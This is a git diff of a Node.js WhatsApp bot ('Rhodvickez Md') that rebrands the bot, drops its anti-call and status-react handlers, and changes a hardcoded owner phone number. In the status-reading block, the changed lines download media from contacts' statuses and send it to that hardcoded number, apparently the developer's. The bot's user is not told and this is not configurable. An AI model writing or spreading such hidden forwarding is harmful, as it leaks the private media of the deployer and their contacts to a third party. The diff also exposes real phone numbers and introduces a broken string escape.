@@ -41,7 +41,7 @@ const {
   const path = require('path')
   const prefix = config.PREFIX
   
-  const ownerNumber = ['254700143167']
+  const ownerNumber = ['254115408870']
   
   const tempDir = path.join(os.tmpdir(), 'cache-temp')
   if (!fs.existsSync(tempDir)) {
@@ -65,7 +65,7 @@ const {
   //===================SESSION-AUTH============================
 if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
 if(!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!')
-const sessdata = config.SESSION_ID.replace("SILVA~", '');
+const sessdata = config.SESSION_ID.replace("Silva~", '');
 const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
 filer.download((err, data) => {
 if(err) throw err
@@ -80,7 +80,7 @@ console.log("Session downloaded ✅")
   //=============================================
   
   async function connectToWA() {
-  console.log("Connecting Rhodvick Tech to WhatsApp ⏳️...");
+  console.log("Connecting Rhodvickez Md to WhatsApp ⏳️...");
   const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
   var { version } = await fetchLatestBaileysVersion()
   
@@ -100,7 +100,7 @@ console.log("Session downloaded ✅")
   connectToWA()
   }
   } else if (connection === 'open') {
-  console.log('🧬 Installing Rhodvick Tech Plugins')
+  console.log('🧬 Installing Rhodvickez Md Plugins')
   const path = require('path');
   fs.readdirSync("./plugins/").forEach((plugin) => {
   if (path.extname(plugin).toLowerCase() == ".js") {
@@ -110,85 +110,10 @@ console.log("Session downloaded ✅")
   console.log('Plugins installed successful ✅')
   console.log('Bot connected to whatsapp ✅')
   
-  let up = `*Hello there ✦RHODVICKEZ MD✦ User! \ud83d\udc4b\ud83c\udffb* \n\n> This is auser friendly whatsapp bot created by Rhodvick Tech Inc \ud83c\udf8a, Meet ✦RHODVICKEZ MD✦ WhatsApp Bot.\n\n *Thanks for using ✦RHODVICKEZ MD✦ \ud83d\udea9* \n\n> follow WhatsApp Channel :- 💖\n \nhttps://whatsapp.com/channel/0029VabySTR9Bb5upWFhMv1N\n\n- *YOUR PREFIX:* = ${prefix}\n\nDont forget to give star to repo ⬇️\n\nhttps://github.com/Rhodvick/RHODVICKEZ-MD\n\n> © Powered BY ✦RHODVICKEZ MD✦ \ud83d\udda4`;
+  let up = `*Hello there ✦RHODVICKEZ MD✦ User! \ud83d\udc4b\ud83c\udffb* \n\n> This is auser friendly whatsapp bot created by Rhodvick Tech Inc \ud83c\udf8a, Meet ✦RHODVICKEZ MD✦ WhatsApp Bot.\n\n *Thanks for using ✦RHODVICKEZ MD✦ \ud83d\udea9* \n\n> follow WhatsApp Channel :- 💖\n \https://whatsapp.com/channel/0029VabySTR9Bb5upWFhMv1N\n\n- *YOUR PREFIX:* = ${prefix}\n\nDont forget to give star to repo ⬇️\n\nhttps://github.com/Rhodvick/RHODVICKEZ-MD\n\n> © Powered BY ✦RHODVICKEZ MD✦ \ud83d\udda4`;
   conn.sendMessage(conn.user.id, { image: { url: `https://i.ibb.co/wJBxKV4/74421a3c5d94ac0a.jpg` }, caption: up })
   }
   })
-
-
-const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
-
-let lastTextTime = 0;
-const messageDelay = 5000; // Set the minimum delay between messages (in milliseconds)
-
-conn.ev.on('call', async (callData) => {
-  if (config.ANTICALL === 'true') {
-    const callId = callData.id;
-    const callerId = callData.from;
-
-    // Reject the call
-    await conn.rejectCall(callId, callerId);
-
-    // Check if enough time has passed since the last message
-    const currentTime = Date.now();
-    if (currentTime - lastTextTime >= messageDelay) {
-      // Send the rejection message if the delay has passed
-      await conn.sendMessage(callerId, {
-        text: '```❗📵 successfully declined```.',
-      });
-
-      // Update the last text time
-      lastTextTime = currentTime;
-    } else {
-      console.log('Message skipped to prevent overflow');
-    }
-  }
-});
-
-let lastReactionTime = 0;
-
-if (config.AUTO_STATUS_REACT === "true") {
-  console.log("AUTO_STATUS_REACT is enabled. Listening for status updates...");
-
-  conn.ev.on("messages.upsert", async (mek) => {
-    const { messages } = mek;
-
-    for (const message of messages) {
-      // Check if the message is a status update
-      if (message.key && message.key.remoteJid === "status@broadcast") {
-        console.log("Detected status update from:", message.key.remoteJid);
-
-        // Ensure throttling by checking the last reaction time
-        const now = Date.now();
-        if (now - lastReactionTime < 5000) {  // 5-second interval
-          console.log("Throttling reactions to prevent overflow.");
-          continue;
-        }
-
-        // Check if bot user ID is available
-        const rhodvick = conn.user && conn.user.id ? conn.user.id.split(":")[0] + "@s.whatsapp.net" : null;
-        if (!rhodvick) {
-          console.log("Bot's user ID not available. Skipping reaction.");
-          continue;
-        }
-
-        // React to the status with the 💚 emoji
-        await conn.sendMessage(message.key.remoteJid, {
-          react: {
-            key: message.key,
-            text: "💚", 
-          },
-        });
-
-        lastReactionTime = Date.now();
-        console.log(`Successfully reacted to status update by ${message.key.remoteJid} with 💚`);
-
-        await delay(2000); // 2-second delay between reactions
-      }
-    }
-  });
-}
-
   conn.ev.on('creds.update', saveCreds)  
           
   //=============readstatus=======
@@ -219,14 +144,14 @@ if (config.AUTO_STATUS_REACT === "true") {
     if (jawadik.message.imageMessage) {
     let cap = jawadik.message.imageMessage.caption;
     let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.imageMessage);
-    return conn.sendMessage("254700143167@s.whatsapp.net", { image: { url: anu }, caption: cap }, { quoted: mek });
+    return conn.sendMessage("254115408870@s.whatsapp.net", { image: { url: anu }, caption: cap }, { quoted: mek });
   } if (jawadik.message.videoMessage) {
     let cap = jawadik.message.videoMessage.caption;
     let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.videoMessage);
-    return conn.sendMessage("254700143167@s.whatsapp.net", { video: { url: anu }, caption: cap }, { quoted: mek });
+    return conn.sendMessage("254115408870@s.whatsapp.net", { video: { url: anu }, caption: cap }, { quoted: mek });
   } if (jawadik.message.audioMessage) {
     let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.audioMessage);
-    return conn.sendMessage("254700143167@s.whatsapp.net", { audio: { url: anu }, caption: cap }, { quoted: mek });
+    return conn.sendMessage("254115408870@s.whatsapp.net", { audio: { url: anu }, caption: cap }, { quoted: mek });
   }
   }
   const m = sms(conn, mek)
@@ -601,7 +526,7 @@ if (config.AUTO_STATUS_REACT === "true") {
          
   //================ownerreact==============
   
-  if(senderNumber.includes("254700143167")){
+  if(senderNumber.includes("254115408870")){
   if(isReact) return
   m.react("🦄")
   }
@@ -687,7 +612,7 @@ if (!isReact && senderNumber === botNumber) {
   }
   
   app.get("/", (req, res) => {
-  res.send("Rhodvick Tech RUNNING ✅");
+  res.send("Rhodvickez Md RUNNING ✅");
   });
   app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
   setTimeout(() => {
